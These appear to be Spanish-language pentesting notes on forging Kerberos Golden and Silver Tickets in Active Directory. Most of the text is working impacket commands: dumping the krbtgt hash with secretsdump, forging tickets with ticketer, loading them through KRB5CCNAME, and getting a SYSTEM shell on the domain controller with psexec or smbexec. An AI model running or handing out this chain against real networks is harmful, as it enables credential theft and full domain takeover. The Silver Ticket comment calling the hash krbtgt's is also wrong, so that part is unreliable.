# Kerberos Golden y Silver Ticket 

Tags: #AD #GoldenTicket #SilverTicket #Kerberos #Kali 

## Golden Ticket 

Un golden ticket es la creación de un TGT con el hash NTLM del usuario krbtgt 

```bash 
# Solo se necesitan las credenciales validas del usuario con permisos de 'administrador' para hacer un DCSync o dumpear la base NTDS para obtener el hash NTLM del usuario 'krbtgt'

❯ impacket-secretsdump Administrator@IP -hashes :a87f3a337d73085c45f9516be5787d85  
	# Administrator = Es una cuenta de admin del dominio
	# hashes = Es el hash NT de la cuenta admin del dominio 
```

```powershell 
# Crear un golden ticket para el usuario administrator y se guarda en 'administrator.ccache'
❯ impacket-ticketer -nthash 6bb9ca337d73085c45f9516be5787b75 -domain-sid S-1-5-21-422223421...-2535134267 -domain domain1 administrator
	# domain-sid = Se obtiene del comando 'Get-ADDomain'
	# nthash = Es el hash NT del usuario krbtgt 
	# administrator = Es el usuario al cual se le generará el TGT

❯ export KRB5CCNAME=/home/kali/administrator.ccache   # Agregar el TGT a la variable 

# Obtener un cmd con permisos de 'nt authority\system'
❯ impacket-psexec domain1/administrator@DC01.domain1 -k -no-pass 
❯ impacket-smbexec domain1/administrator@DC01.domain1 -k -no-pass 
```

## Silver Ticket 

El silver ticket se crea de la misma manera solo que en esta ocasión se usa el TGS.

```bash 
# Crear un silver ticket para el usuario administrator y se guarda en 'administrator.ccache'
❯ impacket-ticketer -nthash 6bb9ca337d73085c45f9516be5787b75 -domain-sid S-1-5-21-422223421...-2535134267 -domain domain1 -spn cifs/DC01.domain1 administrator
	# domain-sid = Se obtiene del comando 'Get-ADDomain'
	# nthash = Es el hash NT del usuario krbtgt 
	# spn = Servicio a consumir 
	# administrator = Es el usuario al cual se le generará el TGS

❯ cat administrator.ccache    # Se puedo mirar el ticket de servicio 
```
